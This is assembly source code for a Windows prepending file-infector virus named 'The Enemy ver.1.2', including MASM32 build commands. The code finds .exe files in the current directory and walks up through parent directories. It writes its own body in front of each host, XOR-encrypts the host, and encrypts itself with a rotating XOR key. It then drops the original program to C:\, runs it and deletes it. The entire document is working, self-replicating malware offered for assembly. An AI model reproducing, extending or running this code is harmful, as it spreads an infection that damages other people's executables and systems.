;;--------------------The enemy virus ver.1.2--------------------------
;
;Virus Name:The Enemy ver.1.2
;Infection Method :Prepending 
;Payloads : None
;With simple multiple-key/xor encryption
;Created In FakedMinded Labs. ;)
;
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;assemble(to get the same virus size):
;  @echo off
;  \masm32\bin\ML   /c /coff  \masm32\the_enemy\theenemy.asm
;  \masm32\bin\LINK \masm32\the_enemy\theenemy.obj  /SUBSYSTEM:windows  /MERGE:.rdata=.text









.586
.model flat,stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc


includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib

vir_size = 3584     ;changeable




.code 

start:
call chekko
jmp _code

;=============================================================================
;=============================================================================
;=============================================================================
enc_size = chekko- like-1
s_power db 18
like:
 db '9'

mark db "9"



signature db "kill the enemy ",0
cur_file_handle dd 0
vect_file_handle dd 0
cur_buffer db 256 dup(0)
extra_buffer db 256 dup(0)
ext db "*.exe",0
wsd WIN32_FIND_DATA<0>
find_handle dd 0
Xize dd 0
vect_mem dd 0
cur_mem dd 0
bwr dd 0
dutdut db "..",0
stinfo STARTUPINFO<0>

prinfo PROCESS_INFORMATION <0>
tempdir db "c:\",0

Csize dd 0

_code:
invoke GetModuleFileName,0,offset cur_buffer,256

call intiate_inf


encode_:

mov eax,cur_mem
mov ecx,vir_size
_find_9:
inc eax
cmp byte ptr[eax],'9'
jne _find_9

inc eax

cmp Csize,vir_size
je _tribe
push eax
call _encode
pop eax

_tribe:

.if s_power>153

mov byte ptr[eax-2],1
mov s_power,1

jmp _again
.endif


add byte ptr [eax-2],1
add s_power,1
call _encode








;--------------------------------------------------------start search

_again:
invoke RtlZeroMemory,offset extra_buffer,256


invoke CloseHandle,find_handle

invoke  FindFirstFile,offset ext,offset wsd

mov find_handle,eax
call infect

search_l00p:
invoke RtlZeroMemory,offset wsd,sizeof wsd

invoke FindNextFile,find_handle,offset wsd

invoke GetLastError
cmp eax,ERROR_NO_MORE_FILES
je exit_search
call infect
jmp search_l00p


exit_search:

invoke GetCurrentDirectory,256,offset extra_buffer
mov ecx,offset extra_buffer
cmp byte ptr [ecx+3],0
je exit_again

invoke SetCurrentDirectory,offset dutdut
jmp _again
exit_again:
;----------------------------------------------------------------------end of search

call drop_old


exit_all:


invoke ExitProcess,0


infect :

invoke CreateFile,offset wsd.cFileName,80000000h or 40000000h,0,0,3,0,0
mov vect_file_handle,eax
invoke GetFileSize,vect_file_handle,0

mov Xize,eax
invoke GlobalAlloc,0,Xize
or eax,eax
jz exit_inf
mov vect_mem,eax
invoke ReadFile,vect_file_handle,vect_mem,Xize,offset bwr,0
or eax,eax
jz exit_inf
mov eax,vect_mem
add eax,Xize
cmp byte ptr [eax-1],'9'
je exit_inf

mov esi,vect_mem
mov ecx,Xize
call encrypt

invoke SetFilePointer,vect_file_handle,FILE_BEGIN,0,0
invoke WriteFile,vect_file_handle,cur_mem,vir_size,offset bwr,0
invoke WriteFile,vect_file_handle,vect_mem,Xize,offset bwr,0
invoke WriteFile,vect_file_handle,offset mark,1,offset bwr,0




invoke CloseHandle,vect_file_handle



exit_inf:


ret

;--------------------------------------rest of functions!
;-------------------------------------


drop_old:

mov eax,cur_mem

add eax,Csize

cmp byte ptr [eax-1],'9'
jne exit_drop


mov esi,offset cur_buffer
add esi,256

loop_slash:
dec esi
cmp byte ptr [esi],'\'
jne loop_slash
inc esi

invoke SetCurrentDirectory,offset tempdir
invoke CreateFile,esi,40000000h,0,0,2,2h,0
mov cur_file_handle,eax
mov eax,cur_mem
add eax,vir_size
mov ecx,Csize
sub ecx,vir_size
push ecx
push esi
mov esi,eax
call encrypt
pop esi
pop ecx

invoke WriteFile,cur_file_handle,eax,ecx,offset bwr,0

invoke CloseHandle,cur_file_handle


invoke GetStartupInfo,offset stinfo
invoke CreateProcess,esi,0,0,0,0,CREATE_NEW_CONSOLE,0,0,offset stinfo,offset prinfo

invoke WaitForSingleObject,prinfo.hThread,-1

_del:
invoke DeleteFile,esi
or eax,eax
jz _del
ret




exit_drop:

ret

intiate_inf:

invoke CreateFile,offset cur_buffer,80000000h,0,0,3,0,0
mov cur_file_handle,eax

invoke GetFileSize,cur_file_handle,0
mov Csize,eax
invoke GlobalAlloc,0,Csize
or eax,eax
jz exit_iinf

mov cur_mem,eax

invoke ReadFile,cur_file_handle,cur_mem,Csize,offset bwr,0
or eax,eax
jz exit_iinf


invoke CloseHandle,cur_file_handle

exit_iinf:


ret



_encode:


xor ecx,ecx
mov ecx,enc_size
xor edx,edx
mov dh,s_power

_o:
xor byte ptr [eax],dh

inc eax
loop _o
ret

encrypt:

_encrypt:

xor byte ptr [esi],3
inc esi
loop _encrypt
ret


;=====================================================================================
;=====================================================================================
;=====================================================================================

chekko:                ;My decryptor<><><><><><><><><><!=fU>
cmp mark,'9'
jne decode
ret
decode:
mov eax,offset mark

mov ecx,enc_size
xor edx,edx
mov dh,s_power

_decode:
xor byte ptr [eax],dh

inc eax
loop _decode

ret





end start
